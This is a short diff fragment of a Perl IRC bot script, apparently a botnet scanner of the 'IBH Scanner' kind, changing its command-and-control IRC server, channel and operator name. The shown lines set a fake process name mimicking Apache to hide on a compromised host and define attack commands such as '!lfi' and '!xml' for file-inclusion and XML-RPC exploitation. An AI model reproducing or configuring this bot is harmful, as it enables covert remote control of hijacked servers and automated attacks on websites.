@@ -39,12 +39,12 @@
     use Digest::MD5 qw(md5_hex);
     use MIME::Base64;
     my $fakeproc    = "/usr/sbin/apache2 -k start";
-    $ircserver      = "irc.byroe.net";
+    $ircserver      = "irc.chating.id";
     my $ircport     = "6667";
     my $nickname    = "dZheNwaY";
     my $ident       = "Malicious";
-    my $channel     = "#IBH";
-    my $runner      = "Malicious";
+    my $channel     = "#csirt";
+    my $runner      = "Zhen";
     my $fullname    = 'IBH Scanner';
     my $lfi                 = "!lfi";
     my $xml                 = "!xml";
